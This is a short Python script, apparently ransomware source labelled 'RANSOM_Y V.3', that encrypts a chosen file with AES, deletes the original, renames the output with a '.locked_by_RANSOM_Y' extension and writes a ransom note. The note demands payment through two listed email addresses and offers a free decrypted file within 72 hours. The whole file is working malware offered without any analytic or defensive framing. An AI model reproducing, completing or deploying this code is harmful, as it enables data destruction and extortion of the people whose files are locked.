from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import os
import secrets

def pad(data):
    """Pads the data to be a multiple of AES block size."""
    return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt(file_name, key):
    """Encrypts the file content with AES-256 and then encodes it with Base64."""
    with open(file_name, 'rb') as f:
        plaintext = f.read()
    padded_text = pad(plaintext)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_text = iv + cipher.encrypt(padded_text)
    os.remove(file_name)
    return base64.b64encode(encrypted_text)

def save_encrypted_file(file_name, data):
    """Saves the encrypted data to a new file with a .enc extension."""
    with open(file_name + ".locked_by_RANSOM_Y", 'wb') as f:
        f.write(data)

def create_notification_file(key):
    """Creates a notification text file to inform the user about the encryption."""
    with open("HOW_TO_RECOVER_YOUR_FILES.txt", 'w') as f:
        f.write("!DANGER ATTENTION!\nYOUR DOCUMENTS,DATABASES,AND OTHER IMPORTANT FILES ARE ENCRYPTED BY RANSOM_Y V.3\nTO DECRYPT ALL OF YOUR FILES, YOU NEED A UNIQUE KEY AND DECRYPTOR\nTHE PRICE OF DECRYPTOR AND KEY IS UP TO YOU CONTACTING US:\nworld-contact_ransom.fleshy646@passinbox.com\nOR\ncontact.herald863@passinbox.com\nTHE TITLE OF YOUR FIRST EMAIL SHOULD BE:\n{0}\n\nNOTICE THAT ONLY WE CAN HELP YOU\nAS A PROOF, WE WILL SEND YOU A FREE DECRYPTED FILE IF YOU CONTACT WITHIN 72HOURS\n\nGood Luck".format(key))

def generate_key():
    """Generates a 32-byte key ending with xRxaxnxsxoxmxY."""
    random_part = secrets.token_urlsafe(32 - len("xRxaxnxsxoxmxY"))  # Generate random part
    return (random_part + "xRxaxnxsxoxmxY")[:32].encode()  # Ensure the key is exactly 32 bytes


def main():
    file_name = input("Enter the file name to encrypt: ")
    key = generate_key()
    encoded_key = base64.b64encode(key).decode()
    encrypted_data = encrypt(file_name, key)
    save_encrypted_file(file_name, encrypted_data)
    create_notification_file(encoded_key)
if __name__ == "__main__":
    main()
